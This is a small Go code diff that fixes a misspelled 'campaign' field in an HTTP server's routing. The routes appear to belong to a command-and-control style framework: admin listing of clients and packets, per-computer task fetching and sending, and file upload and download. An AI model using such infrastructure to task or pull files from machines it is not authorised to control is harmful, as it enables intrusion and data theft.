@@ -20,7 +20,7 @@ func (s *Server) Serve() {
 
 	// Admin Authenticated
 	adminRouter := myRouter.PathPrefix("/admin").Subrouter()
-	adminRouter.Use(GetAdminMiddleware(s.campgain.AdminApiKey))
+	adminRouter.Use(GetAdminMiddleware(s.campaign.AdminApiKey))
 	adminRouter.HandleFunc("/packets", s.adminListPackets)
 	adminRouter.HandleFunc("/packets/{computerId}", s.adminListPacketsComputerId)
 	adminRouter.HandleFunc("/clients", s.adminListClients)
@@ -41,15 +41,15 @@ func (s *Server) Serve() {
 
 	// Client Authenticated
 	clientRouter := myRouter.PathPrefix("/").Subrouter()
-	clientRouter.Use(GetClientMiddleware(s.campgain.ApiKey))
-	clientRouter.HandleFunc(s.campgain.PacketGetPath+"{computerId}", s.getPacket) // /getPacket/{computerId}
-	clientRouter.HandleFunc(s.campgain.PacketSendPath, s.sendPacket)              // /sendPacket
+	clientRouter.Use(GetClientMiddleware(s.campaign.ApiKey))
+	clientRouter.HandleFunc(s.campaign.PacketGetPath+"{computerId}", s.getPacket) // /getPacket/{computerId}
+	clientRouter.HandleFunc(s.campaign.PacketSendPath, s.sendPacket)              // /sendPacket
 
 	// Authentication only via packetId parameter
-	myRouter.HandleFunc(s.campgain.FileUploadPath+"{packetId}", s.uploadFile) // /upload/{packetId}
+	myRouter.HandleFunc(s.campaign.FileUploadPath+"{packetId}", s.uploadFile) // /upload/{packetId}
 	// Authentication based on known filenames
-	myRouter.PathPrefix(s.campgain.FileDownloadPath).Handler(
-		http.StripPrefix(s.campgain.FileDownloadPath, http.FileServer(http.Dir("./static/")))) // /static
+	myRouter.PathPrefix(s.campaign.FileDownloadPath).Handler(
+		http.StripPrefix(s.campaign.FileDownloadPath, http.FileServer(http.Dir("./static/")))) // /static
 
 	// Allow CORS
 	c := cors.New(cors.Options{
